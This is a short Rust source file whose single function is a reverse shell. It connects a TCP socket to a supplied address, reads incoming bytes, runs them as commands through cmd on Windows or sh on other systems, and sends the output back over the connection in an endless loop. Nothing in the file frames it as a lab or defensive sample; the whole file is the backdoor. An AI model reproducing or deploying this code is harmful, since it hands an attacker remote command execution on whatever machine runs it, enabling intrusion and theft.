#[allow(unused_imports)]
use std::error;
use std::io::stdin;
use std::io::{BufRead, Read, Write};
use std::net::{SocketAddr, TcpStream};
use std::process::Command;
extern crate socket2;
use self::socket2::{Domain, Socket, Type};
use http::{Request, Response};


pub fn soc(address: String) -> std::io::Result<()> {
    let mut socket = Socket::new(Domain::IPV4, Type::STREAM, None)?; 
    loop {
        let connection: std::io::Result<()> =
            socket.connect(&address.parse::<SocketAddr>().unwrap().into());
        let mut buffer = [0u8; 512]; 
        let bytes_read = socket.read(&mut buffer).expect("failed to read"); 
        
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd")
                .args(["/C", String::from_utf8_lossy(&buffer[..bytes_read]).trim()])
                .output()
                .expect("failed to execute process")
        } else {
            Command::new("sh")
                .arg("-c")
                .arg(String::from_utf8_lossy(&buffer[..bytes_read]).trim())
                .output()
                .expect("failed to execute process")
        };

        let send_data = output.stdout; 
        socket.send(&send_data);
    }

}
